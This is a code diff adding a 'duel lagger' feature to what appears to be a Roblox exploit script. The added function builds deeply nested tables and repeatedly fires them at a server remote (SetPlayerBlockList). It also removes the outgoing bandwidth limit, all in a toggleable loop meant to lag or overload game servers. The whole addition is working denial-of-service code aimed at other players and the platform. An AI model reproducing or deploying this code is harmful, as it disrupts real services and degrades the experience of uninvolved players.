@@ -380,3 +380,61 @@ end)
 if LocalPlayer.Character then
     createCloverTag()
 end
+local function duelBomb(amt)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i = 1, amt do
+        local t = {}
+        table.insert(z, t)
+        z = t
+    end
+    local max = math.min(499999/(amt+2), 1500)
+    for i = 1, max do
+        table.insert(main, spam)
+    end
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
+    end)
+end
+
+local duelLaggerStatusLabel = nil
+local duelLaggerSwitchBall = nil
+
+local function toggleDuelLagger()
+    State.duelLaggerActive = not State.duelLaggerActive
+
+    if duelLaggerStatusLabel then
+        duelLaggerStatusLabel.Text = State.duelLaggerActive and "STATUS: ACTIVE" or "STATUS: INACTIVE"
+        duelLaggerStatusLabel.TextColor3 = State.duelLaggerActive
+            and Color3.fromRGB(220, 220, 220)
+            or Color3.fromRGB(90, 90, 90)
+    end
+
+    if duelLaggerSwitchBall then
+        TweenService:Create(duelLaggerSwitchBall, TweenInfo.new(0.2), {
+            Position = State.duelLaggerActive
+                and UDim2.new(1, -16, 0.5, -8)
+                or UDim2.new(0, 2, 0.5, -8),
+            BackgroundColor3 = State.duelLaggerActive
+                and Color3.fromRGB(220, 220, 220)
+                or Color3.fromRGB(60, 60, 60),
+        }):Play()
+    end
+
+    if State.duelLaggerActive then
+        State.duelLaggerThread = task.spawn(function()
+            while State.duelLaggerActive do
+                pcall(function()
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                end)
+                duelBomb(270)
+                task.wait(duelLaggerWaitTime)
+            end
+        end)
+    else
+        if State.duelLaggerThread then
+            task.cancel(State.duelLaggerThread)
+            State.duelLaggerThread = nil
+        end
+    end
+end
